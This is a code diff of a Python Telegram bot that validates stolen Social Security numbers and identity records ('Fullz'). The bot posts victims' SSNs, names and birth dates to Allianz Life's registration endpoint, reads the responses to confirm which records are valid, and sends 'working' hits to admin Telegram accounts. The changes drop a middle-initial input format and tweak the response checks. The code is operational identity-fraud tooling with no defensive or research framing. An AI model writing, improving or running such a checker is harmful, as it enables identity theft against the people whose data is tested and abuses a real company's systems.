@@ -10,7 +10,7 @@ admins = [1971995086,1396561970]
 
 
 
-def check_ssn(ssn:int,full_ssn = False,full = [],pattern = 1,recheck = True):
+def check_ssn(ssn:int,full_ssn = False,full = [],recheck = True):
     url = "https://www.allianzlife.com/Registration/individual"
     session = Session()
     resp = session.get(url)
@@ -54,15 +54,12 @@ def check_ssn(ssn:int,full_ssn = False,full = [],pattern = 1,recheck = True):
         return True
     else:
         data["IndividualIdProofing.LastName"] = full[0]
-        if pattern == 2:
-            data["IndividualIdProofing.MiddleInitial"] = full[1]
-            full.pop(1)
         data["IndividualIdProofing.FirstName"] = full[1]
         data["IndividualIdProofing.DateOfBirthMonth"] = full[3]
         data["IndividualIdProofing.DateOfBirthDay"] = full[4]
         data["IndividualIdProofing.DateOfBirthYear"] = full[5]
         response = session.post("https://www.allianzlife.com/SPA/Registration/Handle", json=data , headers= headers)
-        if "fail-existing-account-found" in response.text or not ( "fail-data-mismatch" in response.text or "Show error message" in response.text or "Error" in response.text) :
+        if "fail-existing-account-found" in response.text or not ( "fail-data-mismatch" in response.text or "Show error message" in response.text ) :
             return True
         else:
             if recheck : return False
@@ -72,13 +69,10 @@ def check_ssn(ssn:int,full_ssn = False,full = [],pattern = 1,recheck = True):
         
 def check_format(ssn:str):
     pattern = r'^([^,]+),([^,]+),(\d+),(\d+),(\d+),(\d+)$'
-    second_pattern = r'^([^,]+),([^,]+),([^,]+),(\d+),(\d+),(\d+),(\d+)$'
     if ssn.isdecimal():
         return 0
     elif re.match(pattern,ssn):
         return 1
-    elif re.match(second_pattern,ssn):
-        return 2
     else : return -1 #ignore
 
     
@@ -87,7 +81,7 @@ def save_ssn(ssn:int,name):
 
 
 def send_telegam(ssn:int,telegram_id:int):
-    bot.send_message(telegram_id,f"NEW Working Fullz : {ssn}")
+    bot.send_message(telegram_id,f"NEW Working SSN : {ssn}")
 
 
 @bot.message_handler(content_types=['document'])
